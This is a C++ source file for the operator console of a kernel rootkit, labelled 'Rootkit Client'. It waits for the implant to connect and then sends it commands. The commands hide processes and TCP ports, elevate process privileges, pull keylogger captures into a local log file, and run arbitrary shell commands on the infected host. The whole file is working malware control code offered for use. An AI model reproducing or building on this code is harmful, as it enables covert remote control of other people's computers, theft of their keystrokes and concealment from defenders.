#include "Server.h"
#include "common.h"
#include <sstream>
#include <fstream>

void printMenu();
void awaitCommand(Server::RootkitServer& server);

int main(int argc,char* argv[]) {

	std::cout <<R"###(
______            _   _    _ _     _____ _ _            _   
| ___ \          | | | |  (_) |   /  __ \ (_)          | |  
| |_/ /___   ___ | |_| | ___| |_  | /  \/ |_  ___ _ __ | |_ 
|    // _ \ / _ \| __| |/ / | __| | |   | | |/ _ \ '_ \| __|
| |\ \ (_) | (_) | |_|   <| | |_  | \__/\ | |  __/ | | | |_ 
\_| \_\___/ \___/ \__|_|\_\_|\__|  \____/_|_|\___|_| |_|\__|
                                                                                                          
)###" <<"\n";


	Server::RootkitServer server;

	std::cout << "[+] Waiting on connection...\n";

	//accept a network connection
	bool status = server.Accept();

	if (!status) {
		std::cout << "[+] Couldn't accept a socket connection.\n";
		return -1;
	}

	std::cout << "[+] Got connection!\n";

	printMenu();
	awaitCommand(server);

	
	//Cleanup in server deconstructor...
}


void awaitCommand(Server::RootkitServer& server) {

	while (true) {

		std::cout << "[+] Enter a command to execute\n";
		std::cout << ">>" << std::flush;
		std::string command;
		std::cin >> command;


		if (command == "$testConnection") {
			std::cout << "[+] Enter a message you would like to send to the kernel\n";
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server.SendText("$testConnection " + command);

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << input << "\n";
		}
		else if (command == "$hideProcess") {
			std::cout << "[+] Enter the pid of a process you would like to hide\n";
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server.SendText("$hideProcess " + command);

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << input << "\n";
		}
		else if (command == "$hidePort") {
			std::cout << "[+] Enter the port you would like to hide\n";
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server.SendText("$hidePort " + command);

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << input << "\n";
		}
		else if (command == "$elevateProcess") {
			std::cout << "[+] Enter the pid of a process whose privilages you would like to elevate\n";
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server.SendText("$elevateProcess " + command);

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << input << "\n";
		}
		else if (command == "$keylogger") {

			bool status = server.SendText("$keylogger");

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << "[+] keylogger input saved in keylog.txt\n";
			std::ofstream logfile("keylog.txt", std::ios::app);
			logfile << input;
			logfile.close();
		}
		else if (command == "$shellExecute") {
			std::cout << "[+] Enter the command you would like to execute\n";
			std::cout << ">>" << std::flush;
			std::getline(std::cin >> std::ws, command);

			std::cout << command <<'\n';

			bool status = server.SendText("$shellExecute " + command);

			if (!status)
				return;

			std::string input;

			status = server.ReceiveText(input);
			if (!status)
				return;

			std::cout << input << "\n";
		}
		else if (command == "$help") {
			printMenu();
		}
		else if (command == "$exit") {
			server.SendText("$exit");
			break;
		}
		else {
			std::cout << "command not recognized! try again\n\n";
		}

	}
}
void printMenu() {
	std::cout << "[+] list of commands:\n\n";

	std::cout << "$testConnection - test connection with driver\n";
	std::cout << "$hideProcess    - hide a process by pid\n";
	std::cout << "$hidePort       - hide a TCP connection by port\n";
	std::cout << "$elevateProcess - elevate privilages of a process by pid\n";
	std::cout << "$keylogger      - get recent keylogger output\n";
	std::cout << "$shellExecute   - execute a shell command\n";
	std::cout << "$help           - print this menu\n";
	std::cout << "$exit           - end connection with rootkit and exit\n\n";
}

